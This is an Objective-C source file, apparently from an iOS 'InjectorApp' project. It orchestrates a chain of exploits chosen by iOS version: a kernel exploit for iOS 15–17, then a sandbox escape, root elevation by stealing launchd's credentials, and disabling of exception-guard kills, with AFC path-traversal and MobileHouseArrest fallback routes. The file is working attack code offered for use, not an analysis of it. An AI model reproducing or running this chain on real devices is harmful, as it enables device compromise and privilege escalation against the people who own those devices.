//
//  KernelAccess.m
//  Dash / InjectorApp
//
//  Reconstructed exploit orchestrator and route management
//

#import "KernelAccess.h"
#import "AirLiftAccess.h"
#import "kexploit.h"
#import "offsets.h"
#include <sys/utsname.h>

static BOOL s_isReady = NO;
static NSInteger s_activePath = KernelAccessPathNone;
static NSString *s_statusMessage = @"Exploit: not started\niOS %@ | sandbox locked";

@implementation KernelAccess

+ (BOOL)isReady {
    return s_isReady;
}

+ (NSInteger)activePath {
    return s_activePath;
}

+ (NSString *)statusMessage {
    return s_statusMessage;
}

+ (NSString *)systemVersion {
    return [[UIDevice currentDevice] systemVersion];
}

+ (BOOL)version:(NSString *)version atLeast:(NSString *)minVersion lessThan:(NSString *)maxVersion {
    NSComparisonResult compMin = [version compare:minVersion options:NSNumericSearch];
    NSComparisonResult compMax = [version compare:maxVersion options:NSNumericSearch];
    return (compMin != NSOrderedAscending && compMax == NSOrderedAscending);
}

+ (BOOL)supportsKernelPath {
    // Supports iOS 15.0 up to 17.0 (DarkSword / kfd / opa334 exploit)
    NSString *ver = [self systemVersion];
    return [self version:ver atLeast:@"15.0" lessThan:@"17.0"];
}

+ (BOOL)supportsMHAPath {
    // Checks if CFBundleIdentifier is com.apple.mobile.MobileHouseArrest
    NSString *bundleId = [[NSBundle mainBundle] bundleIdentifier];
    return [bundleId isEqualToString:@"com.apple.mobile.MobileHouseArrest"];
}

+ (BOOL)supportsAirLiftPath {
    // AFC socket path traversal
    NSString *ver = [self systemVersion];
    return [self version:ver atLeast:@"17.0" lessThan:@"27.0"];
}

+ (void)activateMHAPath {
    s_activePath = KernelAccessPathMHA;
    s_isReady = YES;
    s_statusMessage = [NSString stringWithFormat:@"MHA path active (iOS %@)", [self systemVersion]];
}

+ (BOOL)startAirLiftPath:(NSError **)error {
    s_statusMessage = @"Inicializando AirLift...";
    if ([AirLiftAccess prepare:error]) {
        s_activePath = KernelAccessPathAirLift;
        s_isReady = YES;
        s_statusMessage = [NSString stringWithFormat:@"AirLift path ready (iOS %@)", [self systemVersion]];
        return YES;
    }
    s_statusMessage = [NSString stringWithFormat:@"[KernelAccess] AirLift falhou: %@", [AirLiftAccess statusMessage]];
    return NO;
}

+ (BOOL)startKernelPath:(NSError **)error {
    s_statusMessage = @"Running DarkSword kexploit...";
    int ret = ds_kexploit_opa334();
    if (ret != 0) {
        s_statusMessage = [NSString stringWithFormat:@"kexploit failed (%d)", ret];
        return NO;
    }
    
    uint64_t selfProc = proc_self();
    if (!selfProc) {
        s_statusMessage = @"kexploit ok but proc_self is 0";
        return NO;
    }
    
    // Disable sandbox restriction
    int sbx_ret = ds_sandbox_escape(selfProc);
    // Elevate credentials to root (steal launchd ucred)
    int root_ret = sandbox_elevate_to_root(selfProc);
    
    // Disable exception guard kills
    uint64_t selfTask = task_self();
    disable_excguard_kill(selfTask);
    
    s_activePath = KernelAccessPathKernel;
    s_isReady = YES;
    s_statusMessage = [NSString stringWithFormat:@"Kernel path ready (sandbox escaped + root) iOS %@", [self systemVersion]];
    return YES;
}

+ (BOOL)startRecommendedPath:(NSError **)error {
    if ([self supportsKernelPath]) {
        return [self startKernelPath:error];
    } else if ([self supportsAirLiftPath]) {
        if ([self startAirLiftPath:error]) {
            return YES;
        }
        NSLog(@"[KernelAccess] AirLift falhou, tentando MHA fallback...");
        if ([self supportsMHAPath]) {
            [self activateMHAPath];
            return YES;
        }
    } else if ([self supportsMHAPath]) {
        [self activateMHAPath];
        return YES;
    }
    
    s_statusMessage = [NSString stringWithFormat:@"Nenhum caminho suportado para iOS %@", [self systemVersion]];
    return NO;
}

+ (void)resetState {
    s_isReady = NO;
    s_activePath = KernelAccessPathNone;
    s_statusMessage = [NSString stringWithFormat:@"Exploit: not started\niOS %@ | sandbox locked", [self systemVersion]];
}

@end
